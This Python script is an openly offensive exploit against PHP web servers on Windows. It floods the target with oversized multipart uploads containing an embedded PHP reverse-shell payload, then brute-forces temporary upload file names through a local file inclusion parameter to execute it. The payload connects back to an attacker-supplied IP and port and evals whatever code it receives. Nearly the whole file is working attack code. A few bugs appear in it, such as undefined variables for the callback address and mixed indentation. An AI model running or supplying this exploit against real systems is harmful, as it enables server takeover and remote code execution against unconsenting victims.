import argparse
import socket
import urllib2
import random
import traceback
from urllib2 import HTTPError

def gen_packet(shell, host, indexphp):
	bad = 'POST /' + indexphp + ' HTTP/1.1\r\n'
	bad += 'Host: ' + host + '\r\n'
	bad += 'User-Agent: Mozila/5.0\r\n'
	bad += 'Accept: */*\r\n'
	bad += 'Content-Type: multipart/form-data; boundary=---------------------------32917364219558108233580962733\r\n'
	bad += 'Connection: keep-alive\r\n'
	bad += 'Content-Length: 8122000\r\n'
	bad += 'Origin: http://' + 'A' * 3084 + '\r\n'
	for i in range(1,93,1):
		bad += 'AdvancedHeaderName' + str(i) + ':' + 'A' *  3084 + '\r\n'
	bad += 'Referer: http://' + 'A' * 3084 + '\r\n\r\n'
	for i in range(1,129,1):
		bad += '-----------------------------32917364219558108233580962733\r\n'
		bad += 'Content-Disposition: form-data; name="user_file_name' + str(i) + '"; filename="' + str(i) + 'A' * 6144 + '.php"\r\n'
		bad += 'Content-Type: application/x-php\r\n\r\n'
		bad += shell + '\r\n'
	return bad

def send_packet(host,port,shell,indexphp,lfiphp):
	test = gen_packet(shell, host, indexphp)
	try:
		sock1 = socket.socket()
		sock1.connect((host, port))
		sock1.send(test.encode())
	except socket.error:
		print ('\033[31;1m[!] Web server not respond\033[0m')
		exit(0)
	print ('[*] Sending bad packets')
	try:
		sock2 = socket.socket()
		sock2.connect((host, port))
		sock2.send(test.encode())
		sock3 = socket.socket()
		sock3.connect((host, port))
		sock3.send(test.encode())
		sock4 = socket.socket()
		sock4.connect((host, port))
		sock4.send(test.encode())
		sock5 = socket.socket()
		sock5.connect((host, port))
		sock5.send(test.encode())
		sock6 = socket.socket()
		sock6.connect((host, port))
		sock6.send(test.encode())
		sock7 = socket.socket()
		sock7.connect((host, port))
		sock7.send(test.encode())
		sock8 = socket.socket()
		sock8.connect((host, port))
		sock8.send(test.encode())
		sock9 = socket.socket()
		sock9.connect((host, port))
		sock9.send(test.encode())
		sock10 = socket.socket()
		sock10.connect((host, port))
		sock10.send(test.encode())
		sock11 = socket.socket()
		sock11.connect((host, port))
		sock11.send(test.encode())
		sock12 = socket.socket()
		sock12.connect((host, port))
		sock12.send(test.encode())
		sock13 = socket.socket()
		sock13.connect((host, port))
		sock13.send(test.encode())
		sock14 = socket.socket()
		sock14.connect((host, port))
		sock14.send(test.encode())
		sock15 = socket.socket()
		sock15.connect((host, port))
		sock15.send(test.encode())
		sock16 = socket.socket()
		sock16.connect((host, port))
		sock16.send(test.encode())
		sock17 = socket.socket()
		sock17.connect((host, port))
		sock17.send(test.encode())
		sock18 = socket.socket()
		sock18.connect((host, port))
		sock18.send(test.encode())
		sock19 = socket.socket()
		sock19.connect((host, port))
		sock19.send(test.encode())
		sock20 = socket.socket()
		sock20.connect((host, port))
		sock20.send(test.encode())
		sock21 = socket.socket()
		sock21.connect((host, port))
		sock21.send(test.encode())
		sock22 = socket.socket()
		sock22.connect((host, port))
		sock22.send(test.encode())
		sock23 = socket.socket()
		sock23.connect((host, port))
		sock23.send(test.encode())
		sock24 = socket.socket()
		sock24.connect((host, port))
		sock24.send(test.encode())
		sock25 = socket.socket()
		sock25.connect((host, port))
		sock25.send(test.encode())
		sock26 = socket.socket()
		sock26.connect((host, port))
		sock26.send(test.encode())
		sock27 = socket.socket()
		sock27.connect((host, port))
		sock27.send(test.encode())
		sock28 = socket.socket()
		sock28.connect((host, port))
		sock28.send(test.encode())
		sock29 = socket.socket()
		sock29.connect((host, port))
		sock29.send(test.encode())
		sock30 = socket.socket()
		sock30.connect((host, port))
		sock30.send(test.encode())
	except socket.error:
		print ('\033[31;1m[!] Web server not respond\033[0m')
		exit(0)
	alpth = [0,1,2,3,4,6,7,8,9,10,11,12,13,14,15]
	c=0
	cf=50625
	check=1
	php=[]
	print ('[*] Starting brute force')
	while c!=cf:
		rand = ( str('{:x}'.format(alpth[random.randint(0, 14)]).title()) + str('{:x}'.format(alpth[random.randint(0, 14)]).title()) +  str('{:x}'.format(alpth[random.randint(0, 14)]).title()) + str('{:x}'.format(alpth[random.randint(0, 14)]).title()) )
		while check!=0:
			if php.count(rand)>0:
				check=1
			else:
				check=0
				php.append(rand)
		url = ('http://' + host + '/' + lfiphp + '=C:\Windows\Temp\php' + rand + '.tmp')
		req = urllib2.Request(url)
		try:
			resp = urllib2.urlopen(req)
		except KeyboardInterrupt:
			exit(0)
		except HTTPError:
			print ('\033[31;1m[!] Error on opening address: http://' + host + '/' + lfiphp + '=index.php\033[0m')
			exit(0)
		except Exception:
			print ('\033[31;1m[!] Unknow error\033[0m')
			print (traceback.format_exc())
		else:
		        content = resp.read().split('\n')
			if  content[0] == 'Found it!':
		                print ("\033[32;1m[!] Found link. It's a C:\Windows\Temp\php" + rand + ".tmp\033[0m")
				print ('[*] Starting shell')
				url = ('http://' + host + '/' + lfiphp + '=C:\Windows\Temp\php' + rand + '.tmp&shell=true')
				req = urllib2.Request(url)
				resp = urllib2.urlopen(req)
				exit(0)
			c+=1
			check=1

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('lhost', action='store', type=str, help='Your IP address where will be sended shell')
	parser.add_argument('-lp', '--lport', default="4444", action='store', type=int, help='Your port')
	parser.add_argument('rhost', action='store', type=str, help='Remote host IP wich will be attacked')
	parser.add_argument('-rp', '--rport', default="80", action='store', type=int, help='Port of attacking host')
	parser.add_argument('indexphp', action='store', type=str, help='Some *.php file')
	parser.add_argument('lfiphp', action='store', type=str, help='Php file with LFI')
	args = parser.parse_args()
	shell = '''<?php echo 'Found it!'; if (isset($_GET['shell'])) { error_reporting(0); $ip = "''' + ip + '''"; $port = ''' + str(port) + '''; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die(); }?>'''
	try:
		send_packet(args.rhost,int(args.rport),shell,args.indexphp,args.lfiphp)
	except KeyboardInterrupt:
		print ('\nExit...')
